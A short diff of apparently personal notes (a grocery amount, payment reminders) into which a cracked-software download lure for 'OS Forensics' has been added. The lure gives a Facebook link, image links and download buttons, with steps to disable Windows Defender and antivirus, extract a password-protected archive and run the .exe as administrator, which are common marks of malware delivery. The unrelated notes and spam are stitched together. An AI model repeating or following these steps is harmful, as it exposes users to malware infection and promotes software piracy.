@@ -23,4 +23,18 @@ Kroger 85.82 dollars
 write a check
 don't send Zelle
 
-get OS Forensics cracked
+get OS Forensics cracked https://www.facebook.com/media/set/?set=a.691366073663284&type=3
+
+![](https://i.imgur.com/3RC5BoQ.png)
+
+Facebook
+
+![](https://i.imgur.com/SW7vauG.png)
+
+DOWNLOAD FILE HERE
+Download Link 1 Download Link 2
+Instructions
+Step 1: If you do not have this program you can download it here.
+Step 2: Temporary disable Windows Defender and Antivirus. It is needed for they don’t block the Crack File.
+Step 3: Download the file, unzip using WinRAR. Password for unzip – “2025“
+Step 4: Open .exe file Run as administrator!
